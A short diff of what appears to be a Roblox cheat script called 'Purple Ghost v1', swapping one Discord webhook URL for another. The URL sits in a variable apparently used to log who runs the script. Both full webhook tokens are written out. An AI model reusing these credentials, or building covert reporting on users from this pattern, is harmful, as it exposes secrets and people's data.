@@ -6,7 +6,7 @@
 getgenv().whscript = "Purple Ghost v1"
 
 getgenv().webhookexecUrl =
-    "https://discord.com/api/webhooks/1524147244251484190/kWONdxvJpubk7ggCnur4Q22NjCNDR_iezJhafEMmtxUB-i7AGqk0f7knKWDDd32pv4tl"
+    "https://discord.com/api/webhooks/1529585191767638159/cRUluyhnV-ulutNoFDS8weRXo51-Do6grNufD8fJ8qgMRqz1b1Q-pOtcD87Ko5-e0KPI"
 
 --// ANTI-LOGGER / URL BLOCK
 local functions = {
